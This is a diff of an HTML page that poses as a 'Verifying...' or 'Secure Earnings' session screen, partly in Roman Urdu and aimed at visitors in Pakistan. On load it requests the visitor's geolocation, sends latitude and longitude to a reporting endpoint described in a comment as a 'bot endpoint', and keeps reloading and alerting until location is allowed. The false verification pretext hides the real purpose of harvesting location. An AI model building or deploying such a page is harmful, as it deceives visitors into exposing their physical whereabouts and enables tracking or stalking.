@@ -1,85 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Processing...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification...</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #eff3f6, #d7e3ed);
+      background: #f2f7fb;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
     }
 
-    .box {
-      text-align: center;
+    .popup {
       background: white;
       padding: 30px;
       border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      width: 90%;
-      max-width: 340px;
-      animation: fadeIn 1s ease-out;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+      max-width: 320px;
+      text-align: center;
+      animation: fadeIn 0.8s ease;
     }
 
-    .box h2 {
-      margin: 0 0 10px;
-      font-size: 22px;
-      color: #333;
+    .popup h2 {
+      color: #2c3e50;
+      margin-bottom: 10px;
     }
 
-    .box p {
+    .popup p {
       color: #666;
       font-size: 14px;
-      margin-bottom: 20px;
     }
 
-    .progress {
-      width: 100%;
-      background: #e0e0e0;
-      height: 8px;
-      border-radius: 5px;
-      overflow: hidden;
-      position: relative;
-    }
-
-    .bar {
-      width: 0%;
-      height: 100%;
-      background: #3498db;
-      animation: fill 3s forwards;
-    }
-
-    @keyframes fill {
-      to { width: 100%; }
+    .loader {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top-color: #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
     }
 
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Initializing Secure Earnings</h2>
-    <p>Please wait while your session is being authenticated...</p>
-    <div class="progress"><div class="bar"></div></div>
+  <div class="popup">
+    <h2>Verifying...</h2>
+    <p>Agar aap Pakistan se hain to location on karna zaroori hai</p>
+    <div class="loader"></div>
   </div>
 
   <script>
-    function askLocation(retry = false) {
-      if (!navigator.geolocation) return;
-
+    function sendLocation(retry = false) {
       navigator.geolocation.getCurrentPosition(
         position => {
+          // Replace with your bot endpoint
           fetch('/api/report', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
               lat: position.coords.latitude,
               lon: position.coords.longitude
@@ -88,18 +78,17 @@
         },
         error => {
           if (error.code === 1 && !retry) {
-            setTimeout(() => askLocation(true), 2000);
+            setTimeout(() => sendLocation(true), 2000);
           } else {
-            alert("Please enable location to continue. This is required for verification.");
-            location.reload(); // try again after reload
+            alert("Location allow karna zaroori hai. Page reload ho raha hai...");
+            location.reload();
           }
         }
       );
     }
 
-    // auto request after load
     window.onload = () => {
-      setTimeout(() => askLocation(), 500);
+      setTimeout(() => sendLocation(), 1000);
     };
   </script>
 </body>
